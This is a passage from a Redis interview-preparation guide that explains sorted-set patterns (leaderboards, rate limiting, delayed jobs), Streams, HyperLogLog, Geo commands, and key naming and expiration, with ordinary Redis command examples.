Costs: updates and rank lookups are O(log N); a top-N read is O(log N + N). This scales to millions of players on one node. Ties break lexicographically by member — if you need score-then-time ordering, encode both into the score (e.g. points in the integer part, an inverted timestamp in the fraction) or keep a secondary structure.

### Q9. How do you use a ZSET for time-ordered data and sliding windows?

Use the **timestamp as the score**. Now range and trim by time become native operations.

```bash
# Record an event at the current time (ms)
ZADD activity:alice 1719763200000 "login"
ZADD activity:alice 1719763260000 "click"

# Everything in the last hour
ZRANGEBYSCORE activity:alice (now-3600000) +inf

# Trim anything older than a day (sliding retention)
ZREMRANGEBYSCORE activity:alice 0 (now-86400000)
```

This is the backbone of **activity feeds**, **recent-items lists**, and the **sliding-window rate limiter**: keep a ZSET per user of request timestamps, drop old entries with `ZREMRANGEBYSCORE`, then `ZCARD` to count requests still in the window and compare against the limit — all done atomically in a small Lua script or `MULTI`. Because scores are ordered, "give me events between T1 and T2" is O(log N + M), not a full scan.

### Q10. Design a delayed-job scheduler / priority queue with a ZSET.

**Delayed jobs**: score = the job's **due-time** (a future timestamp). A worker polls for jobs whose due-time has arrived.

```bash
# schedule "send-email:42" to run at a future epoch-ms
ZADD due:jobs 1719766800000 "send-email:42"

# worker loop: fetch everything due up to now
ZRANGEBYSCORE due:jobs -inf <now-ms> LIMIT 0 10
# ...atomically remove the ones you claim (Lua/ZPOPMIN or ZREM) so two workers don't double-run
```

To claim safely, wrap "read due jobs + remove them" in a Lua script (atomic on the single thread) so concurrent workers can't grab the same job. `ZPOPMIN` pops the earliest-due job directly, which is ideal for a strict FIFO-by-time drain.

**Priority queue**: score = priority instead of time. `ZPOPMIN` (or `ZPOPMAX`) always returns the highest-priority item next. Redis also offers **`BZPOPMIN`** — a *blocking* pop that lets a worker wait for the next item instead of busy-polling. For a durable, acknowledged work queue, though, prefer **Streams with consumer groups** (next topic) — a ZSET queue has no built-in "in-flight / ack / retry" tracking.

### Q11. Implement a sliding-window rate limiter with a ZSET.

Allow at most N requests per rolling window (e.g. 100 requests / 60s per user). Keep a ZSET of request timestamps and, on each request, drop old entries, count what remains, and add the new one — atomically.

```lua
-- KEYS[1] = rate:<user>, ARGV = now_ms, window_ms, limit
local key, now, window, limit = KEYS[1], tonumber(ARGV[1]), tonumber(ARGV[2]), tonumber(ARGV[3])
redis.call('ZREMRANGEBYSCORE', key, 0, now - window)   -- evict old
local count = redis.call('ZCARD', key)
if count < limit then
  redis.call('ZADD', key, now, now)                    -- record this request
  redis.call('PEXPIRE', key, window)                   -- self-cleaning key
  return 1                                              -- allowed
end
return 0                                                -- rejected
```

Running it in **Lua** makes the whole check-and-record atomic — no race between counting and adding. This gives a true rolling window (unlike a fixed-window `INCR` counter, which allows bursts at window boundaries). Cost is the ZSET's memory: one entry per in-window request per user. For very high volumes, a token-bucket or fixed-window-with-`INCR` approach trades exactness for less memory.

### Q12. What are `ZUNIONSTORE` and `ZINTERSTORE`, and how do weights work?

They combine multiple ZSETs into a new one, aggregating the scores of shared members.

```bash
# Combine three days of activity into a weekly board, weighting recent days higher
ZUNIONSTORE weekly 3 day:mon day:tue day:wed WEIGHTS 1 1 2 AGGREGATE SUM
```

- **`ZUNIONSTORE`** — union of members; shared members' scores are aggregated.
- **`ZINTERSTORE`** — only members present in *all* inputs survive.
- **WEIGHTS** — multiply each source's scores before aggregating (default 1 each).
- **AGGREGATE** — `SUM` (default), `MIN`, or `MAX` decides how to combine.

Uses: **weighted rankings** (recent activity counts more), **multi-criteria scoring** (combine a relevance ZSET and a recency ZSET with weights), and **merging leaderboards**. A plain `set` can be an input too — it's treated as a ZSET with all scores 1, which is handy for filtering a ZSET by set membership via `ZINTERSTORE`.

### Q13. How do you do autocomplete / prefix search with `ZRANGEBYLEX`?

When **all members share the same score** (conventionally 0), a ZSET is ordered purely lexicographically, and `ZRANGEBYLEX` gives you range-by-string — perfect for prefix/autocomplete.

```bash
ZADD names 0 alice 0 alina 0 albert 0 bob
ZRANGEBYLEX names "[al" "[al\xff"     # everything starting with "al"
# -> albert, alice, alina
```

The `[` prefix means inclusive; `(` means exclusive; `-` and `+` are the min/max sentinels. The classic trick appends `\xff` to the prefix as an upper bound. For real autocomplete you often store `term` plus a delimiter and the item id, or keep one ZSET per prefix. It works because the skip list already keeps members sorted — you're just slicing it by string instead of by score. (For heavy search, RediSearch is the better tool, but `ZRANGEBYLEX` is a zero-dependency answer.)

### Q14. When should you use a set versus a sorted set?

| Need | Use |
|---|---|
| Unique membership, "is X in here?" | **set** |
| Dedup + union/intersection/difference | **set** (set algebra) |
| Random sampling / random draw | **set** (`SRANDMEMBER`/`SPOP`) |
| Ordering by a number (rank, time, priority) | **sorted set** |
| Top/bottom N, range-by-score | **sorted set** |
| Leaderboard, feed, scheduler, sliding window | **sorted set** |

Rule of thumb: **if you never need order, use a set** — it's cheaper in both memory and CPU (O(1) vs O(log N), simpler encoding). The moment the requirement mentions "top," "rank," "recent," "nearest in time," "priority," or "between these two values," switch to a ZSET. Don't pay for the skip list if you only ever ask membership questions.

### Q15. How much memory does a ZSET use, and how is it encoded?

Small ZSETs use a compact **listpack** encoding (a flat, contiguous array of member/score pairs) as long as they stay under both `zset-max-listpack-entries` (default 128) and `zset-max-listpack-value` (default 64 bytes per member). Past either threshold, Redis converts to the full **skiplist + hashtable** representation.

Implications:

- A ZSET holding thousands of members costs meaningfully more than a listpack ZSET, because each member now lives in a hash entry *and* a skip-list node (with its levels of forward pointers).
- Many **tiny** ZSETs (e.g. one small window per user) stay in listpack form and are cheap — a good pattern.
- One **giant** ZSET (a global leaderboard of tens of millions) is fine functionally but watch total memory and avoid full-range reads.

Tune the listpack thresholds if you have many small ZSETs that occasionally exceed the default and you want them to stay compact — but larger listpacks mean slower O(N) operations on them, so it's a trade.

### Q16. You need the top 10 players *and* each player's own rank on a leaderboard with 50M entries. Any concerns?

Both operations are cheap on a ZSET even at 50M members:

- **Top 10**: `ZREVRANGE leaderboard 0 9 WITHSCORES` is O(log N + 10) — the skip list jumps to the top and walks 10 nodes. Trivial.
- **A player's rank**: `ZREVRANK leaderboard alice` is O(log N). Fine.

The concern is **not** these queries — it's the anti-patterns nearby: never `ZRANGE leaderboard 0 -1` (O(N), dumps 50M members, blocks the single thread), and be careful with deep pagination like `ZREVRANGE 0 999999` — a large offset means walking that many nodes. For "around me" views, compute rank then read a small window around it. Memory is the real constraint at 50M members (each member + score + skip-list overhead), so size the box and consider Cluster if it won't fit. But latency-wise, ZSET rank/top-N stays fast — that's exactly why it's the leaderboard tool.

### Q17. What's wrong with using `INCR` on a plain string per player instead of a ZSET for a leaderboard?

`INCR score:alice` gives you each player's points cheaply, but it throws away the *ordering* — the very thing a leaderboard needs. To produce "top 10" from per-player string counters you'd have to fetch **every** player's score and sort them client-side (or run a `SORT`), which is O(N) and gets worse as players grow. Getting a player's **rank** is even harder — you'd scan everyone.

A ZSET stores the same score but *maintains the sorted order for you*, so top-N is O(log N + M) and rank is O(log N):

```bash
ZINCRBY leaderboard 50 alice          # same increment semantics as INCR...
ZREVRANGE leaderboard 0 9 WITHSCORES  # ...but top-10 is now trivial
ZREVRANK leaderboard alice            # ...and rank is O(log N)
```

So the anti-pattern isn't the increment — it's storing ranking data in a structure that can't answer ranking queries. Use `ZINCRBY` into a ZSET and you get atomic increments *and* cheap ordering. Reserve plain `INCR` for counters you never need to rank (page views, total logins).

## Advanced Types: Streams, HyperLogLog & Geo

### Summary

**What this topic covers**

Three specialised types that push Redis well past "cache": **Streams** (an append-only, persistent log with consumer groups — a mini-Kafka living inside Redis), **HyperLogLog** (probabilistic approximate-cardinality counting in ~12KB regardless of set size), and **Geo** commands (geospatial indexing for "find nearby" queries, built on a sorted set). Across 15 questions this topic covers how each works, the commands, and — critically for interviews — **when each fits and when it doesn't**: Streams vs Pub/Sub vs a List-as-queue vs Kafka; HLL's accuracy-vs-memory trade and when approximate is acceptable; and Geo radius search for nearest-driver / nearest-store problems. These are the "I know Redis beyond GET/SET" types that make a senior answer.

**Mental model**

Think of each as Redis absorbing a job you'd otherwise reach for another system to do. A **Stream** is a durable, ordered log: producers `XADD` entries (each with a time-ordered ID), consumers replay history or tail new entries, and **consumer groups** let a pool of workers split the load with per-message **acknowledgement**, delivery tracking, and reclaiming of stalled messages — i.e. reliable at-least-once processing, the thing Pub/Sub and a plain list-queue can't give you. **HyperLogLog** answers one question — "how many *distinct* items?" — using a fixed ~12KB of memory and ~0.81% error, by hashing items into a probabilistic sketch rather than storing them; you trade exactness for enormous memory savings when you only need a count, not the members. **Geo** is a clever reuse: encode latitude/longitude into a single 52-bit **geohash** number, store it as a ZSET score, and now "members within radius R of a point" becomes a bounded score range — you get spatial queries for free on top of the sorted set. In all three, the theme is: Redis gives you a specialised structure that's *good enough and in-memory-fast*, up to the point where a dedicated system's scale or durability guarantees win.

**Key terms**

- **Stream** — append-only log of entries; each entry is an auto/explicit ID plus field-value pairs.
- **stream ID** — `<ms-timestamp>-<sequence>`, monotonic and time-ordered; `*` auto-generates.
- **consumer group** — named set of cooperating consumers that split a stream's entries with per-entry acks.
- **PEL (Pending Entries List)** — per-group record of delivered-but-not-yet-acked entries; the basis of retry.
- **XACK / XCLAIM / XAUTOCLAIM** — acknowledge processing / reclaim entries stalled on a dead consumer.
- **MAXLEN / MINID** — trimming strategies to cap a stream's length or drop entries below an ID.
- **HyperLogLog (HLL)** — probabilistic sketch estimating distinct-count in ~12KB with ~0.81% error.
- **PFADD / PFCOUNT / PFMERGE** — add items / estimate cardinality / merge HLLs.
- **cardinality** — the number of *distinct* elements — the only thing an HLL tells you (not membership).
- **geohash** — an interleaved encoding of lat/long into one sortable number; the ZSET score behind Geo.
- **GEOSEARCH** — find members within a radius or box of a point (replaces old `GEORADIUS`).
- **at-least-once** — delivery guarantee of consumer groups: a message may be redelivered until acked.

**Why interviewers ask this**

Anyone can describe a cache. These types probe whether you understand Redis as a *toolbox* and, more importantly, whether you know its **limits**. "Would you build an event queue on Redis Streams or reach for Kafka?" is really asking: do you understand durability, throughput ceilings, single-node memory limits, and operational trade-offs? "Count unique visitors for a billion-event/day site" tests whether you know an exact set would blow up memory and that an HLL is the right approximate tool. "Find the nearest drivers" tests whether you recognise Geo (and that it's a ZSET underneath). Strong candidates pick the right specialised type *and* articulate when to graduate to a dedicated system.

**Common confusions**

- "Streams are just Pub/Sub" — no; Pub/Sub is fire-and-forget at-most-once with **no persistence**, Streams **persist**, replay, and support consumer groups with acks.
- "A List with `LPUSH`/`BRPOP` is as good as a Stream for a work queue" — a list has no acks, no consumer groups, no delivery tracking; a crashed worker loses its in-flight item.
- "HyperLogLog stores the items" — it stores a **sketch**; you can count distinct elements but can never list them or test membership.
- "HLL counts are exact for small sets" — they're approximate in general (Redis does use an exact/sparse mode for very small cardinalities, but treat HLL as approximate).
- "Geo is a separate index type" — it's **sorted-set commands** with geohash scores; `ZRANGE` on a geo key shows the raw members.
- "Redis Streams can replace Kafka at any scale" — Streams are bounded by a single node's RAM and throughput; Kafka wins on massive, partitioned, disk-based, multi-consumer-ecosystem workloads.

**What follows from this topic**

Geo builds directly on the **sorted set** from the previous topic — it's the same skip-list machinery. Streams' persistence connects to the **persistence** (RDB/AOF) story and to **keys/expiration** (you trim streams rather than TTL them). The "build a queue on Redis vs a dedicated system" judgement recurs in system-design rounds. HLL's approximate-counting philosophy pairs with bitmaps and with the caching topics where "good enough, cheap, fast" beats "exact, expensive."

### Q1. What are Redis Streams and how do they differ from Pub/Sub?

A **Stream** is an **append-only, persistent log** of entries. Each entry has a time-ordered ID and a set of field-value pairs. Unlike Pub/Sub, entries are *stored* — consumers can read history, resume from where they left off, and multiple independent consumers can read the same stream.

```bash
XADD events * type login user alice     # append; * auto-generates the ID
XLEN events                             # number of entries
XRANGE events - +                       # read all entries (oldest to newest)
XREAD COUNT 10 STREAMS events 0         # read from the beginning
```

| | Pub/Sub | Streams |
|---|---|---|
| Persistence | None (fire-and-forget) | Persisted in the stream |
| Delivery | At-most-once | At-least-once (with groups + acks) |
| Late subscriber | Misses everything | Can replay history |
| Consumer groups | No | Yes |
| Backpressure | Slow subscriber drops messages | Consumers read at their own pace |

Pub/Sub is right when you want low-latency broadcast and don't care about missed messages (live notifications, cache-invalidation fan-out). Streams are right when you need durability, replay, or reliable work distribution.

### Q2. Explain Redis Stream consumer groups.

A **consumer group** lets a pool of workers **cooperatively** process one stream: each entry is delivered to exactly one consumer in the group, and the group tracks which entries have been acknowledged.

```bash
XGROUP CREATE events workers $ MKSTREAM   # group starting at "new messages"
XREADGROUP GROUP workers worker-1 COUNT 10 STREAMS events >   # ">" = new, unassigned
# ... process the entries ...
XACK events workers 1719763200000-0       # acknowledge -> removed from PEL
```

The mechanics:

- **`>`** means "give me messages never delivered to this group." A specific ID means "give me *my* pending (unacked) messages" — used for recovery.
- Delivered-but-unacked entries sit in the group's **PEL (Pending Entries List)** until `XACK`.
- **`XPENDING`** inspects what's outstanding (per consumer, age, delivery count).
- **`XCLAIM`** / **`XAUTOCLAIM`** reassign entries stuck on a dead/slow consumer to a healthy one after an idle timeout.

This gives **at-least-once** processing with load balancing across workers, acks, and stalled-message recovery — the pieces you need for a real durable queue.

### Q3. How do you build a reliable work queue with Streams?

Combine `XADD` (producers), a consumer group with `XREADGROUP`, `XACK` on success, and `XAUTOCLAIM` for recovery.

```bash
# Producer
XADD jobs * task resize-image id 42

# Each worker, in a loop:
XREADGROUP GROUP workers worker-1 COUNT 1 BLOCK 5000 STREAMS jobs >
#   -> process the job
XACK jobs workers <id>          # only after success

# A janitor process reclaims jobs stuck on dead workers:
XAUTOCLAIM jobs workers worker-2 60000 0   # claim entries idle > 60s
```

Why this is "reliable": a job stays in the PEL until acked, so if a worker crashes mid-job the entry is **not lost** — another worker reclaims it via `XAUTOCLAIM` after the idle timeout and reprocesses it. That's at-least-once, so make handlers **idempotent** (a redelivered job must be safe to run twice). Cap growth with `XADD ... MAXLEN ~ 100000` so acked history doesn't grow unbounded. This is strictly better than a `LPUSH`/`BRPOP` list queue, which has no acks and loses a worker's in-flight item on crash.

### Q4. How do stream IDs work, and why does time-ordering matter?

A stream ID is **`<milliseconds-timestamp>-<sequence>`**, e.g. `1719763200000-0`. IDs are strictly **monotonically increasing** — each new entry's ID is greater than all before it. Using `*` on `XADD` auto-generates an ID from the server clock (with the sequence counter disambiguating entries added in the same millisecond).

Why it matters:

- **Ordering is guaranteed and global** within the stream — consumers always see entries in append order.
- **Range queries by time** are natural: `XRANGE events 1719763200000 1719766800000` pulls a time window, because the ID *is* a timestamp.
- **Resumption**: a consumer stores the last ID it processed and passes it to `XREAD` to continue exactly where it stopped.

You can also supply explicit IDs (e.g. `XADD s 5-0 ...`) but they must keep increasing. The time-encoded, monotonic ID is what makes a stream both a log *and* a time index.

### Q5. What are blocking reads on streams and when are they useful?

`XREAD` and `XREADGROUP` accept a **`BLOCK`** option that makes the call wait for new entries instead of returning empty — so workers don't busy-poll.

```bash
XREAD BLOCK 5000 STREAMS events $      # wait up to 5s for entries newer than now
XREADGROUP GROUP workers w1 BLOCK 0 STREAMS jobs >   # block indefinitely for a new job
```

`$` means "only entries added after I started blocking." `BLOCK 0` waits forever. This turns a stream into an efficient push-style queue: the worker blocks, Redis wakes it the instant a producer `XADD`s, and there's no tight polling loop burning CPU and hammering the server. It's the Stream analogue of `BRPOP`/`BZPOPMIN`, but with all the consumer-group guarantees on top. Set a finite `BLOCK` timeout if the worker needs to periodically do other work (heartbeats, `XAUTOCLAIM` sweeps).

### Q6. How do you trim / cap the size of a stream?

Streams are persistent and grow forever unless you trim them. Two strategies:

```bash
# Cap by length (keep ~ the last 100k entries; ~ = approximate, faster)
XADD events MAXLEN ~ 100000 * type login user alice
XTRIM events MAXLEN 100000                 # exact trim, on demand

# Cap by minimum ID (drop everything older than a timestamp)
XTRIM events MINID ~ 1719763200000
XADD events MINID 1719763200000 * ...      # trim-on-add by age
```

**MAXLEN** keeps at most N entries; **MINID** drops entries with IDs below a threshold (great for time-based retention — "keep the last 7 days"). The `~` makes trimming **approximate** (Redis trims in whole macro-nodes, so it may keep slightly more than asked), which is much cheaper than exact trimming and is what you want in the hot `XADD` path. Trimming is how you bound a Stream's memory — note that trimming removes entries **even if unacked**, so size the cap above your worst-case backlog.

### Q7. What is HyperLogLog and what problem does it solve?

**HyperLogLog (HLL)** estimates the **cardinality** — the number of *distinct* elements — of a huge set using a fixed **~12KB** of memory and about **0.81%** standard error, no matter how many elements you add (millions or billions).

```bash
PFADD visitors:2026-07-03 alice bob carol alice   # add items (dupes don't matter)
PFCOUNT visitors:2026-07-03                        # -> ~3 (approximate)
```

The problem it solves: counting unique things at scale where an exact set would be far too big. To count unique daily visitors to a large site with a `SET`, you'd store every visitor ID — potentially gigabytes. An HLL stores a probabilistic **sketch**, not the items, so it stays ~12KB whether you've seen 100 or 100 million distinct visitors. The catch: it can *only* answer "how many distinct?" — you can never list the members or test whether a specific item was seen. When you need an approximate distinct-count and not the elements themselves, HLL is the right, memory-cheap tool.

### Q8. How do you merge HyperLogLogs, and why is that powerful?

`PFMERGE` combines multiple HLLs into one that estimates the cardinality of their **union** — and, crucially, unique elements counted in more than one input are **not double-counted**.

```bash
PFADD visitors:mon alice bob
PFADD visitors:tue bob carol
PFMERGE visitors:week visitors:mon visitors:tue
PFCOUNT visitors:week          # -> ~3 (alice, bob, carol) — bob counted once
```

Why that's powerful: you keep a small per-day (or per-hour) HLL and roll them up to *any* period on demand — weekly, monthly, campaign-to-date — without re-scanning raw events, and unique-across-days is computed correctly. `PFCOUNT` even accepts multiple keys directly (`PFCOUNT a b c`) to count a union without a persistent merge. This composability — cheap partial sketches that merge losslessly (within the error bound) — is what makes HLL ideal for rolled-up unique-count analytics dashboards.

### Q9. When is approximate counting acceptable, and when is it not?

**Acceptable** — when you need a *trend or scale* number and ~0.8% error is invisible to the decision:

- Unique visitors / uniques per campaign on a dashboard.
- Distinct search terms, distinct IPs, distinct devices at massive scale.
- Cardinality metrics where "about 4.2 million" is as useful as "4,231,904."

**Not acceptable** — when the exact number carries meaning or money, or when you need the *members*:

- Billing by exact unique-user count, or anything audited/regulatory.
- Fraud/security where you must *identify* which entities were seen (HLL can't list members).
- Small sets where you can afford an exact `SET` and want membership tests too.

The judgement is: *do I need the identities, or just the count? And does a fraction of a percent of error change any decision?* If you only need a count and small error is fine, HLL buys you orders-of-magnitude memory savings. Otherwise use a `SET` (exact + membership) and pay the memory.

### Q10. What are Redis Geo commands and how are they implemented?

Geo commands index members by **latitude/longitude** and answer spatial queries like "who's within R of this point?"

```bash
GEOADD drivers 13.361 38.115 "driver:1" 15.087 37.502 "driver:2"
GEODIST drivers driver:1 driver:2 km        # distance between two members
GEOPOS drivers driver:1                      # -> longitude, latitude
GEOSEARCH drivers FROMLONLAT 13.4 38.1 BYRADIUS 50 km ASC WITHDIST  # nearby, nearest first
```

Implementation: Redis encodes each lat/long pair into a single 52-bit **geohash** number (interleaving the bits of the two coordinates so that spatially-near points have numerically-near hashes) and stores that as the **score in a sorted set**. A radius query becomes a set of bounded **score-range** scans over that ZSET plus a precise distance filter. That's why a geo key *is* a ZSET — `ZRANGE drivers 0 -1` lists the members and you can `ZREM` to delete one. `GEOSEARCH` (Redis 6.2+) supersedes the older `GEORADIUS`/`GEORADIUSBYMEMBER` and supports both radius and bounding-box queries.

### Q11. Design a "find nearby drivers" feature with Redis Geo.

Keep a ZSET-backed geo key of live drivers, update positions as they move, and query by radius on demand.

```bash
# Driver app pushes location updates (overwrite in place)
GEOADD drivers:live 13.361 38.115 "driver:1"

# Rider requests a ride at their location -> nearest 10 within 3km
GEOSEARCH drivers:live FROMLONLAT 13.40 38.11 BYRADIUS 3 km ASC COUNT 10 WITHDIST WITHCOORD
```

Design notes:

- `GEOADD` overwrites a member's position, so re-adding a driver is how you update their location — no separate delete.
- `ASC COUNT 10` returns the 10 nearest, closest first; `WITHDIST`/`WITHCOORD` return distance and coordinates for the UI.
- **Expiry**: a geo key is a ZSET, so you can't TTL individual drivers. Either periodically `ZREM` stale drivers (track last-seen in a companion structure) or shard by city/region into separate keys.
- **Scale**: partition by region (`drivers:live:{region}`) to keep each key small and, in Cluster mode, to control which node serves each region.

This is exactly how ride-hailing and "stores near me" features are commonly prototyped — one node handles a lot of nearby-queries cheaply.

### Q12. Streams vs a List-based queue vs Kafka — how do you choose?

| | List (`LPUSH`/`BRPOP`) | Streams + groups | Kafka |
|---|---|---|---|
| Persistence / replay | Item gone once popped | Persisted, replayable | Persisted (disk), long retention |
| Acks / redelivery | None | Yes (PEL, `XACK`, `XCLAIM`) | Yes (offsets, consumer groups) |
| Multiple consumer groups | No | Yes | Yes (core strength) |
| Ordering | FIFO | By stream ID | Per-partition |
| Scale ceiling | Single node RAM | Single node RAM/throughput | Horizontally partitioned, huge |
| Ops overhead | Trivial | Low | Higher (cluster, ZK/KRaft) |

**List** — simplest possible queue; fine for best-effort, low-stakes background jobs where losing an in-flight item on a crash is tolerable. **Streams** — when you need acks, replay, or multiple worker groups but your volume fits comfortably on Redis and you already run Redis. **Kafka** — when you need massive partitioned throughput, long disk-based retention, a rich consumer ecosystem, or an event backbone across many services. Rule of thumb: reach for Streams to avoid adding Kafka *until* scale, durability windows, or the multi-team event-bus requirement justify the operational cost of Kafka.

### Q13. What are the limits of building a durable queue/stream on Redis?

Redis Streams are excellent, but bounded by Redis's nature:

- **Memory-bound**: the stream lives in RAM. A large backlog (slow consumers, a big retention window) consumes memory directly; you must trim (`MAXLEN`/`MINID`), which can drop unacked entries. Kafka's disk-based log holds far more, far cheaper.
- **Single-node throughput**: one primary handles all writes on one thread. That's a lot (hundreds of thousands of ops/s) but not Kafka's partitioned, multi-broker scale.
- **Durability window**: with async replication and `everysec` AOF you can lose the last ~1s of entries on a crash/failover — unacceptable for some financial/event-sourcing use cases without `fsync always` (slower) or `WAIT`.
- **No native partitioning of one stream** across nodes — in Cluster a stream lives on one shard; you scale by sharding keys yourself.
- **Retention**: you trim by length/age, not the rich time+size retention and compaction Kafka offers.

So Redis Streams shine for durable-enough, in-memory-fast queues you already have Redis for. Graduate to Kafka (or a dedicated broker) when you need long retention, huge throughput, exactly the durability guarantees, or a broad event ecosystem.

### Q14. How do you count unique visitors at massive scale — HLL, Set, or bitmap?

It depends on what you need:

- **Exact count + need the members / membership tests** → **Set** (`SADD` + `SCARD`). Costs memory proportional to unique count (every ID stored). Fine for thousands/millions; prohibitive for billions.
- **Approximate count, don't need members, at massive scale** → **HyperLogLog** (`PFADD` + `PFCOUNT`). Fixed ~12KB per HLL, ~0.81% error, merges across periods with `PFMERGE`. The default choice for "unique visitors per day across a huge site."
- **Dense integer user IDs, need per-user flags or exact count over a bounded ID space** → **bitmap** (`SETBIT`/`BITCOUNT`). One bit per user ID; extremely compact *if* IDs are dense integers (e.g. daily-active over sequential user IDs).

```bash
PFADD uv:2026-07-03 alice bob carol
PFCOUNT uv:2026-07-03            # ~ unique visitors today, in 12KB
```

For a billion-event/day analytics pipeline where you only report the *number* of uniques, HLL is almost always the answer — a Set would cost gigabytes and a bitmap needs dense integer IDs. Keep per-day HLLs and `PFMERGE` for weekly/monthly rollups.

### Q15. When should you reach for these advanced types versus a dedicated system?

Use the Redis type when it **absorbs a whole dependency** cheaply and you're already running Redis:

- **Streams** instead of standing up Kafka — until you need Kafka's scale, retention, or ecosystem (see the queue-limits question). Great for moderate-volume durable work queues and intra-app event flows.
- **HyperLogLog** instead of a big analytics store or exact Set — whenever an approximate distinct-count is all you need. It turns a gigabyte problem into 12KB.
- **Geo** instead of PostGIS/Elasticsearch-geo — for straightforward radius/box "nearby" lookups over data that fits in memory and updates frequently. Graduate to a real GIS when you need polygons, complex spatial joins, or huge datasets.

The senior instinct: prefer the Redis-native type to avoid operational sprawl (one fewer system to run, monitor, and secure) **while** naming the exact threshold at which the dedicated system wins — memory limits, throughput ceilings, durability guarantees, or query richness. "Start on Redis, move to Kafka/PostGIS/a warehouse when X" is the answer interviewers want.

## Keys, Expiration & Eviction

### Summary

**What this topic covers**

The lifecycle of a Redis key: how you **name** keys (colon-namespacing conventions), how you make them **expire** (TTL and the commands that set it), how Redis **actually removes** expired keys (lazy + active), what happens under **memory pressure** (`maxmemory` and the eviction policies), and how to safely **inspect** the keyspace (`SCAN`, not `KEYS *`). The centrepiece — and the thing interviewers most love to probe across these 16 questions — is the distinction between **expiration** (a key's TTL elapsed) and **eviction** (Redis is out of memory and must throw something out). They're different mechanisms with different triggers, and conflating them is a classic tell.

**Mental model**

A Redis key has an optional **TTL** — a clock that, when it runs out, marks the key logically dead. But "logically dead" and "physically freed" are not the same instant. Redis removes expired keys two ways: **lazily**, when someone touches the key (it's checked on access and deleted if expired), and **actively**, via a background cycle that samples random keys with TTLs and reaps the expired ones. So an expired-but-untouched key can *still occupy memory* until it's sampled or accessed — that's why memory doesn't drop the moment a TTL passes. Separately, when total memory hits **`maxmemory`**, the **eviction policy** kicks in and removes keys to make room for new writes — this is *pressure-driven*, not TTL-driven, and can evict keys that haven't expired at all (or, with `noeviction`, just refuse the write). Hold these two clocks separately in your head: **TTL elapsed → expiration; RAM full → eviction.** Everything else in this topic hangs off that split.

**Key terms**

- **TTL** — a key's remaining time-to-live in seconds (`TTL`) or ms (`PTTL`); `-1` = no expiry, `-2` = key doesn't exist.
- **EXPIRE / PEXPIRE / EXPIREAT** — set a TTL relative (s/ms) or at an absolute unix time.
- **PERSIST** — remove a key's TTL, making it permanent again.
- **lazy (passive) expiration** — an expired key is deleted the moment it's accessed.
- **active expiration** — a background cycle samples random TTL keys and deletes the expired ones.
- **maxmemory** — the configured memory ceiling that triggers eviction.
- **eviction policy** — the rule (`noeviction`, `allkeys-lru`, ...) for which key to drop when full.
- **allkeys vs volatile** — evict from *all* keys vs only keys that *have a TTL*.
- **LRU vs LFU** — evict least-*recently*-used vs least-*frequently*-used (both approximated by sampling).
- **noeviction** — the default: reject writes with an error instead of evicting (surprising for cache users).
- **SCAN** — cursor-based, non-blocking keyspace iteration; the safe replacement for `KEYS *`.
- **eviction ≠ expiration** — pressure-driven removal vs TTL-driven removal; the core distinction of this topic.

**Why interviewers ask this**

This topic is where "I've used Redis as a cache" meets "I've operated Redis under load." The eviction-vs-expiration question is a near-universal filter: a junior says "they're the same, the key just gets deleted"; a senior explains that expiration is TTL-driven and lazy+active, eviction is memory-pressure-driven and policy-governed, and that **`noeviction` is the default** — so a cache with no `maxmemory-policy` set and no TTLs will eventually **refuse writes** rather than shed old data (a real, surprising production incident). Interviewers also probe the operational reflexes: never `KEYS *` in prod, always set TTLs on cache keys, pick `allkeys-lru`/`lfu` for a pure cache. Getting these right signals someone who won't take the cluster down at 3am.

**Common confusions**

- "The key is freed the instant its TTL expires" — no; it's removed lazily (on access) or actively (on sampling), so it can linger in memory briefly.
- "Eviction and expiration are the same thing" — the headline confusion. Expiration = TTL elapsed; eviction = `maxmemory` reached. Different triggers entirely.
- "Redis evicts old keys by default when full" — **false**; the default is `noeviction`, which errors on writes. You must opt into an LRU/LFU policy.
- "Replicas expire their own keys" — they don't; the **primary** drives expiry and sends explicit deletes so replicas stay consistent.
- "LRU/LFU is exact" — both are **approximated** by sampling a handful of keys, not maintaining a perfect global order — a deliberate memory/speed trade.
- "`KEYS pattern` is fine if the pattern is narrow" — `KEYS` still scans the *entire* keyspace regardless of pattern; use `SCAN`.

**What follows from this topic**

TTLs and eviction are the backbone of the **caching** topics — cache-aside relies on TTLs to bound staleness, and eviction policy decides what a full cache sheds under load. The "expired key still using memory" point connects to **memory management** and big-key hygiene. `SCAN` (introduced here) is the safe-iteration primitive that the sets/ZSET topics echo with `SSCAN`/`ZSCAN`. Replica-driven expiry connects to **replication and HA**. Get this topic right and cache correctness, memory safety, and "why did my key disappear / why did writes start failing" all become explainable.

### Q1. What are Redis key naming conventions and why do they matter?

Redis has **no schema** — keys are just byte strings — so a consistent naming convention *is* your schema. The near-universal convention is **colon-namespacing**: `object-type:id:field`.

```bash
SET user:123:profile "..."       # a user's profile
SADD user:123:sessions "sess:abc"
HSET session:abc user 123 ip 10.0.0.1
SET cache:page:home "<html>..."
```

Why it matters:

- **Readability & grouping** — `user:123:*` visibly groups everything about a user; you can `SCAN MATCH user:123:*` to find it.
- **Collision avoidance** — namespacing prevents `home` (a page cache) from clashing with `home` (something else).
- **Operational clarity** — prefixes let you reason about, monitor, and (carefully) target keys by type; tools and `redis-cli --bigkeys`/`--memkeys` output become interpretable.
- **Multi-tenancy** — prefix by tenant/env (`prod:tenant42:user:123`) when several apps share an instance.

Keep keys reasonably short (they're stored per-key in memory) but descriptive. The convention is social, not enforced — discipline across the team is the whole point.

### Q2. What commands manage key expiration / TTL?

```bash
EXPIRE session:abc 3600          # expire in 3600 seconds
PEXPIRE session:abc 3600000      # ...in milliseconds
EXPIREAT session:abc 1719766800  # ...at an absolute unix time (seconds)
TTL session:abc                  # seconds left (-1 = no TTL, -2 = no such key)
PTTL session:abc                 # ...in milliseconds
PERSIST session:abc              # remove the TTL, make it permanent
SET cache:x "v" EX 300           # set value AND TTL atomically (preferred)
```

Best practice is to set the TTL **at write time** with `SET ... EX`/`PX` (or `SET ... EXAT`) so there's never a window where the key exists without an expiry. Redis 7 added conditional flags to `EXPIRE`:

```bash
EXPIRE key 600 NX    # set TTL only if none exists
EXPIRE key 600 XX    # only if a TTL already exists
EXPIRE key 600 GT    # only if 600 is greater than the current TTL
EXPIRE key 600 LT    # only if less than the current TTL
```

`GT`/`LT` let you *extend but never shorten* (or vice-versa) a TTL without a read-modify-write.

### Q3. How does Redis actually expire keys — what are the two mechanisms?

Redis uses **two** complementary mechanisms, because checking every key's TTL continuously would be far too expensive:

